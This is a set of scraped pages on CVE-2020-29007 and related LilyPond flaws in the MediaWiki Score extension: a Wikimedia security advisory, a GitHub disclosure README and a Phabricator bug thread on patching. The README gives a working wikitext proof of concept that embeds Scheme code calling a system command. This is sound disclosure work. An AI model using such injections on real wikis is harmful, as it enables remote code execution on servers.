* [Download QR code](/w/index.php?title=Special:QrCode&url=https%3A%2F%2Fwww.mediawiki.org%2Fwiki%2FExtension%3AScore%2F2021_security_advisory)

Print/export

* [Create a book](/w/index.php?title=Special:Book&bookcmd=book_creator&referer=Extension%3AScore%2F2021+security+advisory)
* [Download as PDF](/w/index.php?title=Special:DownloadAsPdf&page=Extension%3AScore%2F2021_security_advisory&action=show-download-screen)
* [Printable version](/w/index.php?title=Extension:Score/2021_security_advisory&printable=yes "Printable version of this page [p]")

In other projects

Appearance
move to sidebar
hide

From mediawiki.org

< [Extension:Score](/wiki/Extension%3AScore "Extension:Score")

In July 2020, Wikimedia disabled usage of the Score extension following a security report from [Maciej Miszczyk](https://phabricator.wikimedia.org/p/Miszczyk/ "phab:p/Miszczyk/") that it was possible to gain remote code execution through LilyPond. LilyPond was supposed to be contained via firejail, however that containment wasn't enabled because of a configuration error. When it was properly enabled, a bypass was found, plus a remote code execution vulnerability was found in firejail too. Further bypasses of LilyPond's safe mode were found during code audits.

In summary, the following security issues were discovered:

* CVE-2020-29007, MediaWiki Score allows executing arbitrary Scheme code
* [CVE-2020-17353, LilyPond allows arbitrary PostScript and does not use -dSAFER](https://phabricator.wikimedia.org/T258547 "phab:T258547")
  + Mitigated in Score by having MediaWiki run Ghostscript directly instead of relying on Lilypond, see [gerrit:615594](https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/%2B/615594 "gerrit:c/mediawiki/extensions/Score/+/615594").
  + [Upstream fix](https://git.savannah.gnu.org/gitweb/?p=lilypond.git;a=commit;h=b84ea4740f3279516905c5db05f4074e777c16ff)
* [CVE-2020-17367, CVE-2020-17368: Vulnerabilities in firejail due to --output](https://phabricator.wikimedia.org/T258763 "phab:T258763")
  + Mitigated in MediaWiki by disallowing usage of parameters named --output, see [gerrit:629729](https://gerrit.wikimedia.org/r/629729 "gerrit:629729").
  + [Upstream fixes included in 0.9.62.2](https://github.com/netblue30/firejail/releases/tag/0.9.62.2)
* [CVE-2020-17354: LilyPond safe mode escape due to output-def-lookup and output-def-scope](https://phabricator.wikimedia.org/T259210 "phab:T259210") (and [another issue using different functions](https://phabricator.wikimedia.org/T259210#6368852 "phab:T259210"))
* [T260225: not yet publicly disclosed, no CVE assigned yet](https://phabricator.wikimedia.org/T260225 "phab:T260225")

[T257062](https://phabricator.wikimedia.org/T257062 "phab:T257062") and its subtasks was where most coordination and discussion happened. Some more discussion about improving LilyPond's security took place on the [lilypond-devel mailing list](https://lists.gnu.org/archive/html/lilypond-devel/2020-10/msg00096.html) and in private email.

## Re-enabling Score

[[edit](/w/index.php?title=Extension:Score/2021_security_advisory&action=edit&section=1 "Edit section: Re-enabling Score")]

Now in August 2021, Wikimedia has re-enabled Score after isolating LilyPond and other external binaries using [Shellbox](/wiki/Shellbox "Shellbox").

On non-Wikimedia wikis: It is recommended to only enable Score and LilyPond on your wiki if you absolutely trust everyone who has editing privileges, or if you use [Shellbox](/wiki/Shellbox "Shellbox"). Even with "safe mode" enabled, it is not safe to allow LilyPond to process arbitrary input without containment. Ensure you're using a recent version of LilyPond (2.22.0+) or a distribution package (e.g. from Debian) that contains the security fixes. All fixes have been backported to the REL1\_36 branch of Score and can be downloaded from [Git](https://gerrit.wikimedia.org/g/mediawiki/extensions/Score "git:mediawiki/extensions/Score") or the [ExtensionDistributor](/wiki/Special%3AExtensionDistributor/Score "Special:ExtensionDistributor/Score").

Furthermore, it's recommended to keep safe mode enabled, even with containment as an extra layer of defense. We believe Shellbox provides robust sandboxing, but no software is ever perfect, and there will always be the possibility of Kernel/Kubernetes/Docker/etc. bugs that allow for escaping the sandbox. Combined safe mode and Shellbox should make it more difficult for an attacker to exploit a bug in either.

Certain functionality will not work in safe mode, the fix for that is to modify LilyPond to allow that functionality in safe mode. Bugs can be filed in the [Score Phabricator project](https://phabricator.wikimedia.org/tag/mediawiki-extensions-score/ "phab:tag/mediawiki-extensions-score/") or directly in the upstream [LilyPond bug tracker](https://gitlab.com/lilypond/lilypond/-/issues).

The Wikimedia Foundation is looking to fund someone to contribute upstream to LilyPond to improve safe mode. If you're interested, please contact [Tim Starling](/wiki/User%3ATim_Starling "User:Tim Starling").

![](https://login.wikimedia.org/wiki/Special:CentralAutoLogin/start?useformat=desktop&type=1x1&usesul3=0)
Retrieved from "<https://www.mediawiki.org/w/index.php?title=Extension:Score/2021_security_advisory&oldid=5924943>"

* This page was last edited on 14 May 2023, at 04:04.
* Text is available under the [Creative Commons Attribution-ShareAlike License](https://creativecommons.org/licenses/by-sa/4.0/); additional terms may apply. Text in [the Help: namespace](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Help%3AContents) is available under the [Creative Commons CC0 License](https://creativecommons.org/publicdomain/zero/1.0/).
  By using this site, you agree to the [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use) and [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy).

* [Privacy policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy)
* [About mediawiki.org](/wiki/Project%3AAbout)
* [Disclaimers](/wiki/Project%3AGeneral_disclaimer)
* [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct)
* [Developers](https://developer.wikimedia.org)
* [Statistics](https://stats.wikimedia.org/#/www.mediawiki.org)
* [Cookie statement](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ACookie_statement)
* [Mobile view](//m.mediawiki.org/w/index.php?title=Extension:Score/2021_security_advisory&mobileaction=toggle_view_mobile)

* [![Wikimedia Foundation](/static/images/footer/wikimedia-button.svg)](https://wikimediafoundation.org/)
* [![Powered by MediaWiki](/w/resources/assets/poweredby_mediawiki.svg)](https://www.mediawiki.org/)

Search

Search

Toggle the table of contents

Extension:Score/2021 security advisory

Add topic



=== Content from github.com_99c61e23_20250119_125635.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fseqred-s-a%2Fcve-2020-29007)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fseqred-s-a%2Fcve-2020-29007)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=seqred-s-a%2Fcve-2020-29007)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[seqred-s-a](/seqred-s-a)
/
**[cve-2020-29007](/seqred-s-a/cve-2020-29007)**
Public

* [Notifications](/login?return_to=%2Fseqred-s-a%2Fcve-2020-29007) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Fseqred-s-a%2Fcve-2020-29007)
* [Star
   0](/login?return_to=%2Fseqred-s-a%2Fcve-2020-29007)

Remote code execution in Mediawiki Score

[0
stars](/seqred-s-a/cve-2020-29007/stargazers) [1
fork](/seqred-s-a/cve-2020-29007/forks) [Branches](/seqred-s-a/cve-2020-29007/branches) [Tags](/seqred-s-a/cve-2020-29007/tags) [Activity](/seqred-s-a/cve-2020-29007/activity)
 [Star](/login?return_to=%2Fseqred-s-a%2Fcve-2020-29007)

 [Notifications](/login?return_to=%2Fseqred-s-a%2Fcve-2020-29007) You must be signed in to change notification settings

* [Code](/seqred-s-a/cve-2020-29007)
* [Issues
  0](/seqred-s-a/cve-2020-29007/issues)
* [Pull requests
  0](/seqred-s-a/cve-2020-29007/pulls)
* [Actions](/seqred-s-a/cve-2020-29007/actions)
* [Projects
  0](/seqred-s-a/cve-2020-29007/projects)
* [Security](/seqred-s-a/cve-2020-29007/security)
* [Insights](/seqred-s-a/cve-2020-29007/pulse)

Additional navigation options

* [Code](/seqred-s-a/cve-2020-29007)
* [Issues](/seqred-s-a/cve-2020-29007/issues)
* [Pull requests](/seqred-s-a/cve-2020-29007/pulls)
* [Actions](/seqred-s-a/cve-2020-29007/actions)
* [Projects](/seqred-s-a/cve-2020-29007/projects)
* [Security](/seqred-s-a/cve-2020-29007/security)
* [Insights](/seqred-s-a/cve-2020-29007/pulse)

# seqred-s-a/cve-2020-29007

    main[Branches](/seqred-s-a/cve-2020-29007/branches)[Tags](/seqred-s-a/cve-2020-29007/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[3 Commits](/seqred-s-a/cve-2020-29007/commits/main/) | | |
| [README.md](/seqred-s-a/cve-2020-29007/blob/main/README.md "README.md") | | [README.md](/seqred-s-a/cve-2020-29007/blob/main/README.md "README.md") |  |  |
| [binfalse.png](/seqred-s-a/cve-2020-29007/blob/main/binfalse.png "binfalse.png") | | [binfalse.png](/seqred-s-a/cve-2020-29007/blob/main/binfalse.png "binfalse.png") |  |  |
| View all files | | |

## Repository files navigation

* README

**CVEID**: CVE-2020-29007

**Name of the affected product(s) and version(s)**: Mediawiki Score (all versions up to 0.3.0)

**Problem type**: CWE-96: Improper Neutralization of Directives in Statically Saved Code (‘Static Code Injection’)

---

**Summary**

Score is a Mediawiki extension which generates musical notation based on user-provided Lilypond or ABC markup.
During our tests, we have determined it is vulnerable to remote code execution through Scheme code embedded in
Lilypond markup.

All version of Score (up to and including 0.3.0) allow the execution of arbitrary user-controlled code within
the context of a webserver process.

**Description**

Score extension generates musical notation by passing user-controlled Lilypond or ABC markup to a GNU Lilypond binary.
Because the binary is executed without the -dsafe option, it will execute arbitrary Guile Scheme code embedded within
Lilypond markup, including the code which interacts with operating system shell.

To exploit this vulnerability, the attacker must be able to edit any article on the vulnerable wiki.
In most configurations, it should be possible for the unauthenticated attacker.

**Reproduction**

1. Start editing any article on a wiki.
2. Replace the articles contents with the following code:

```
{{Image frame|content=\new Staff <<{g^#
(number->string(system "/usr/bin/false"))
}>>}}

```

3. Click ‘show preview’
4. If the output contains an image which looks like this, the wiki is vulnerable:
   [![256](/seqred-s-a/cve-2020-29007/raw/main/binfalse.png)](/seqred-s-a/cve-2020-29007/blob/main/binfalse.png)

**Mitigation**

Disable Score extension.

## About

Remote code execution in Mediawiki Score

### Topics

[security](/topics/security "Topic: security")
[exploit](/topics/exploit "Topic: exploit")
[mediawiki](/topics/mediawiki "Topic: mediawiki")
[lilypond](/topics/lilypond "Topic: lilypond")
[mediawiki-extension](/topics/mediawiki-extension "Topic: mediawiki-extension")
[cve](/topics/cve "Topic: cve")
[cve-2020-29007](/topics/cve-2020-29007 "Topic: cve-2020-29007")

### Resources

[Readme](#readme-ov-file)

[Activity](/seqred-s-a/cve-2020-29007/activity)
[Custom properties](/seqred-s-a/cve-2020-29007/custom-properties)
### Stars

[**0**
stars](/seqred-s-a/cve-2020-29007/stargazers)
### Watchers

[**1**
watching](/seqred-s-a/cve-2020-29007/watchers)
### Forks

[**1**
fork](/seqred-s-a/cve-2020-29007/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fseqred-s-a%2Fcve-2020-29007&report=seqred-s-a+%28user%29)

## [Releases](/seqred-s-a/cve-2020-29007/releases)

No releases published

## [Packages 0](/orgs/seqred-s-a/packages?repo_name=cve-2020-29007)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from phabricator.wikimedia.org_2a2d2766_20250119_142418.html ===
[HomePhabricator](/)

* SearchConfigure Global Search
 [Auth](/auth/)  Login

Click the *MediaWiki* button below to connect your [Wikimedia unified account](https://meta.wikimedia.org/wiki/Help%3AUnified_login). Alternatively, click the *Wikitech Account (LDAP)* button to connect your [Developer account](https://www.mediawiki.org/wiki/Developer_account) credentials.

In case of doubt, [check the Phabricator Help](https://www.mediawiki.org/wiki/Phabricator/Help#Creating_your_account).

Log In or RegisterMediaWikiDeveloper Account Log InLDAP Account (IDP)
# Log In or Register with LDAP

LDAP UsernameLDAP PasswordLog In or RegisterTrouble logging in? [Send a login link to your email address.](/login/email/)Content licensed under Creative Commons Attribution-ShareAlike (CC BY-SA) 4.0 unless otherwise noted; code licensed under GNU General Public License (GPL) 2.0 or later and other open source licenses. By using this site, you agree to the Terms of Use, Privacy Policy, and Code of Conduct. · [Wikimedia Foundation](https://wikimediafoundation.org/) · [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ANon-wiki_privacy_policy) · [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct) · [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use/Phabricator) · [Disclaimer](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AGeneral_disclaimer) · [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) · [GPL](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html) · [Credits](https://www.mediawiki.org/wiki/Phabricator/Credits)

=== Content from phabricator.wikimedia.org_e6558112_20250119_142419.html ===
Page Menu[HomePhabricator](/)

* SearchConfigure Global Search

[Log In](https://phabricator.wikimedia.org/auth/start/?next=%2FT258547)[Create Task](/maniphest/task/edit/nocreate/) [Maniphest](/maniphest/)  T258547
# LilyPond allows arbitrary PostScript and does not use -dSAFER (CVE-2020-17353)Closed, Resolved[Public](/policy/explain/PHID-TASK-ehwzusnjyfvlsstzykjg/view/)SecurityActions

* [Edit Task](/maniphest/task/edit/258547/)
* Edit Related Tasks...
* [Create Subtask](/maniphest/task/subtask/258547/)
* [Edit Parent Tasks](/search/rel/task.has-parent/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* [Edit Subtasks](/search/rel/task.has-subtask/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* [Merge Duplicates In](/search/rel/task.merge-in/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* [Close As Duplicate](/search/rel/task.close-as-duplicate/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* Edit Related Objects...
* [Edit Commits](/search/rel/task.has-commit/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* [Edit Mocks](/search/rel/task.has-mock/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* Subscribe
* [Mute Notifications](/subscriptions/mute/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* [Protect as security issue](/wmf/escalate-task/258547/)
* [Award Token](/token/give/PHID-TASK-ehwzusnjyfvlsstzykjg/)
* [Flag For Later](/flag/edit/PHID-TASK-ehwzusnjyfvlsstzykjg/)

Assigned To

|  | [faidon](/p/faidon/) |
| --- | --- |

Authored By

|  | [tstarling](/p/tstarling/) |
| --- | --- |
| Jul 22 2020, 1:06 AM2020-07-22 01:06:43 (UTC+0) |

Tags

* [Security-Team](/tag/security-team/) [(Our Part Is Done)](/project/board/1179/)
* [Security](/tag/security/)
* [MediaWiki-extensions-Score](/tag/mediawiki-extensions-score/) [(Backlog)](/project/board/613/)
* [Upstream](/tag/upstream/) [(Backlog)](/project/board/153/)
Referenced FilesNoneSubscribers

|  | [Aklapper](/p/Aklapper/) |
| --- | --- |

|  | [akosiaris](/p/akosiaris/) |
| --- | --- |

|  | [Base](/p/Base/) |
| --- | --- |

|  | [BEANS-X2](/p/BEANS-X2/) |
| --- | --- |

|  | [• brooke](/p/brooke/) |
| --- | --- |

|  | [CDanis](/p/CDanis/) |
| --- | --- |

|  | [Daimona](/p/Daimona/) |
| --- | --- |

[View All 23 Subscribers](/subscriptions/list/PHID-TASK-ehwzusnjyfvlsstzykjg/)
# Description

As noted by [@faidon](/p/faidon/) in [T257062](/T257062), LilyPond allows arbitrary PostScript to be added to the intermediate output. When PNG output is requested, this arbitrary PostScript is passed to GhostScript without -dSAFER. So arbitrary read/write/execute is allowed, even when LilyPond is run with -dsafe.

I've confirmed that the issue is present in LilyPond 2.18, but not in 2.20. It regressed again in the 2.21 unstable branch.

I reported it upstream by email yesterday, and they immediately responded with [a proposed patch](https://gitlab.com/lilypond/lilypond/-/merge_requests/265/diffs) that disables the PostScript injection feature when safe mode is active. It is unclear whether they plan on backporting it to 2.18 but they have agreed that it is a security issue and have asked for discretion pending a release.

WMF production is not currently affected. There will be a workaround in the Score extension, which I think we should announce as an urgent security update for third-party Score users. The vulnerability trivially allows arbitrary execution via wikitext in the default configuration of the Score extension, so it is of high severity.

The workaround will probably be to run LilyPond with --ps, requesting PostScript output, which MediaWiki will convert to PNG by separately running gs -dSAFER.

# Related ObjectsSearch...

* Task Graph
* Mentions

|  |  | Status | Subtype | Assigned | Task |
| --- | --- | --- | --- | --- | --- |
|  |  | Resolved |  | [tstarling](/p/tstarling/) | T257066 [Extension:Score / Lilypond is disabled on all wikis](/T257066) |
|  |  | Open |  | *None* | T259208  [PDF export should render music scores natively, i.e. not as images](/T259208) |
|  |  | Resolved | Security | [tstarling](/p/tstarling/) | T257091 [Re-enable the Score extension in safe mode](/T257091) |
|  |  | Resolved | Security | [Legoktm](/p/Legoktm/) | T257062 [Lilypond seemingly not subject to restrictions (CVE-2020-29007)](/T257062) |
|  |  | Resolved | Security | [faidon](/p/faidon/) | T258547 [LilyPond allows arbitrary PostScript and does not use -dSAFER (CVE-2020-17353)](/T258547) |

Mentioned In [T214021: Enable uploads for LilyPond (.ly) and ABC (.abc) files on Commons](/T214021) Mentioned Here [T259210: LilyPond safe mode escape due to output-def-lookup and output-def-scope (CVE-2020-17354)](/T259210)
[T257062: Lilypond seemingly not subject to restrictions (CVE-2020-29007)](/T257062)
### Event Timeline

[tstarling](/p/tstarling/) triaged this task as High priority.[Jul 22 2020, 1:06 AM2020-07-22 01:06:43 (UTC+0)](#6324806)[tstarling](/p/tstarling/) created this task.[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 22 2020, 12:26 PM2020-07-22 12:26:56 (UTC+0)](#6325965)Comment Actions

I'll get that fixed in 2.18 as shipped in Debian Buster (Stretch lacks a Lilypond package due to Guile bugs which prevented it from entering the release) when upstream considers the issue public (and will also request a CVE)

[tstarling](/p/tstarling/) added a comment.[Jul 23 2020, 6:09 AM2020-07-23 06:09:53 (UTC+0)](#6328519)Comment Actions
> The workaround will probably be to run LilyPond with --ps, requesting PostScript output, which MediaWiki will convert to PNG by separately running gs -dSAFER.

To simplify review and deployment, I uploaded that as a public change at [https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/+/615594](https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/%2B/615594) , but without pointing out that it is a security issue and without linking to this bug. We'll announce what it's actually for when everyone's ready.

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 27 2020, 6:43 AM2020-07-27 06:43:41 (UTC+0)](#6336389)Comment Actions

This is now public: <http://git.savannah.gnu.org/gitweb/?p=lilypond.git;a=commit;h=b84ea4740f3279516905c5db05f4074e777c16ff>

[sbassett](/p/sbassett/) moved this task from [Incoming](/project/board/1179/) to [Watching](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[Jul 27 2020, 3:09 PM2020-07-27 15:09:16 (UTC+0)](#6337837)[Legoktm](/p/Legoktm/) merged a task: Restricted Task.[Jul 28 2020, 7:07 AM2020-07-28 07:07:14 (UTC+0)](#6339786)[tstarling](/p/tstarling/) added a subscriber: [Hanwenn](/p/Hanwenn/).[Jul 31 2020, 8:45 AM2020-07-31 08:45:16 (UTC+0)](#6350997)[dr0ptp4kt](/p/dr0ptp4kt/) added a subscriber: [• brooke](/p/brooke/).[Aug 3 2020, 8:42 PM2020-08-03 20:42:56 (UTC+0)](#6357652)[tstarling](/p/tstarling/) added a comment.[Aug 5 2020, 6:27 AM2020-08-05 06:27:32 (UTC+0)](#6362007)Comment Actions

What is the CVE for this?

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Aug 5 2020, 7:10 AM2020-08-05 07:10:16 (UTC+0)](#6362019)Comment Actions

I haven't heard back, will ping the original "We've received your request" mail later.

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Aug 5 2020, 1:59 PM2020-08-05 13:59:16 (UTC+0)](#6362826)Comment Actions

This is CVE-2020-17353 (which covers both postscript and SVG)

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) renamed this task from LilyPond allows arbitrary PostScript and does not use -dSAFER to LilyPond allows arbitrary PostScript and does not use -dSAFER (CVE-2020-17353).[Aug 5 2020, 1:59 PM2020-08-05 13:59:36 (UTC+0)](#6362827)[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Aug 5 2020, 8:31 PM2020-08-05 20:31:18 (UTC+0)](#6364189)Comment Actions

Given that the commit message is specific, MITRE directly made this one visible in the CVE feed: It's now at <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17353>

What are the upstream plans for commiting a fix for the other issue ([T259210](/T259210))? Ideally this one should not be too far away, so that distros can fix both in a single update.

[tstarling](/p/tstarling/) added a comment.[Aug 5 2020, 11:21 PM2020-08-05 23:21:28 (UTC+0)](#6364566)Comment Actions
> In [T258547#6364189](/T258547#6364189), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
>
> What are the upstream plans for commiting a fix for the other issue ([T259210](/T259210))? Ideally this one should not be too far away, so that distros can fix both in a single update.

I'll forward you the email thread.

[tstarling](/p/tstarling/) mentioned this in [T214021: Enable uploads for LilyPond (.ly) and ABC (.abc) files on Commons](/T214021).[Aug 16 2020, 11:35 PM2020-08-16 23:35:39 (UTC+0)](#6387689)[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Sep 15 2020, 11:01 AM2020-09-15 11:01:31 (UTC+0)](#6462162)Comment Actions

This specific task can be closed, right? It's fixed upstream, there was a DSA for Debian (<https://lists.debian.org/debian-security-announce/2020/msg00163.html>), it's fixed in our Lilypond stretch package and Score extension also applies the workaround with the intermediate step.

[kaldari](/p/kaldari/) subscribed.[Oct 21 2020, 5:14 PM2020-10-21 17:14:43 (UTC+0)](#6569124)Comment Actions

[@tstarling](/p/tstarling/) - Anything left to do here or can this be closed?

[Urbanecm](/p/Urbanecm/) subscribed.[Nov 15 2020, 4:05 PM2020-11-15 16:05:28 (UTC+0)](#6622638)Comment Actions
> In [T258547#6569124](/T258547#6569124), [@kaldari](/p/kaldari/) wrote:
>
> [@tstarling](/p/tstarling/) - Anything left to do here or can this be closed?

Ping? :-)

[hashar](/p/hashar/) unsubscribed.[Apr 28 2021, 8:29 AM2021-04-28 08:29:31 (UTC+0)](#7040962)[Legoktm](/p/Legoktm/) closed this task as Resolved.[Aug 9 2021, 11:13 PM2021-08-09 23:13:49 (UTC+0)](#7271096)[Legoktm](/p/Legoktm/) assigned this task to [faidon](/p/faidon/).[Legoktm](/p/Legoktm/) changed the visibility from "[Custom Policy](/transactions/old/PHID-XACT-TASK-5re3ampiwhjelkl/)" to "Public (No Login Required)".[Legoktm](/p/Legoktm/) changed the edit policy from "[Custom Policy](/transactions/old/PHID-XACT-TASK-jxcfuxqbcv7eici/)" to "All Users".[sbassett](/p/sbassett/) moved this task from [Watching](/project/board/1179/) to [Our Part Is Done](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[Aug 12 2021, 3:07 PM2021-08-12 15:07:42 (UTC+0)](#7279069)[BEANS-X2](/p/BEANS-X2/) subscribed.[Aug 25 2021, 4:14 PM2021-08-25 16:14:19 (UTC+0)](#7308906)Content licensed under Creative Commons Attribution-ShareAlike (CC BY-SA) 4.0 unless otherwise noted; code licensed under GNU General Public License (GPL) 2.0 or later and other open source licenses. By using this site, you agree to the Terms of Use, Privacy Policy, and Code of Conduct. · [Wikimedia Foundation](https://wikimediafoundation.org/) · [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ANon-wiki_privacy_policy) · [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct) · [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use/Phabricator) · [Disclaimer](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AGeneral_disclaimer) · [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) · [GPL](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html) · [Credits](https://www.mediawiki.org/wiki/Phabricator/Credits)

=== Content from www.mediawiki.org_e0657260_20250119_125640.html ===
[Jump to content](#bodyContent)

Main menu

Main menu
move to sidebar
hide

Navigation

* [Main page](/wiki/MediaWiki "Visit the main page [z]")
* [Get MediaWiki](/wiki/Download)
* [Get extensions](/wiki/Special%3AMyLanguage/Category%3AExtensions)
* [Tech blog](https://techblog.wikimedia.org/)
* [Contribute](/wiki/Special%3AMyLanguage/How_to_contribute)

Support

* [User help](/wiki/Special%3AMyLanguage/Help%3AContents "The place to find out")
* [FAQ](/wiki/Special%3AMyLanguage/Manual%3AFAQ)
* [Technical manual](/wiki/Special%3AMyLanguage/Manual%3AContents)
* [Support desk](/wiki/Project%3ASupport_desk)
* [Communication](/wiki/Special%3AMyLanguage/Communication)

Development

* [Developer portal](https://developer.wikimedia.org/)
* [Code statistics](/wiki/Development_statistics)

mediawiki.org

* [Community portal](/wiki/Project%3AHelp "About the project, what you can do, where to find things")
* [Recent changes](/wiki/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Translate content](/wiki/Special%3ALanguageStats)
* [Random page](/wiki/Special%3ARandom "Load a random page [x]")
* [Village pump](/wiki/Project%3AVillage_Pump)
* [Sandbox](/wiki/Project%3ASandbox)

In other languages

[Add links](https://www.wikidata.org/wiki/Special%3AEntityPage/Q21678392#sitelinks-wikipedia "Add interlanguage links")

[![](/static/images/icons/mediawikiwiki.svg)
![MediaWiki](/static/images/mobile/copyright/mediawikiwiki-wordmark.svg)](/wiki/MediaWiki)

[Search](/wiki/Special%3ASearch "Search MediaWiki [f]")

Search

* English

Appearance

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=www.mediawiki.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Extension%3AScore "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=Extension%3AScore "You are encouraged to log in; however, it is not mandatory [o]")

Personal tools

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=www.mediawiki.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Extension%3AScore "You are encouraged to create an account and log in; however, it is not mandatory")
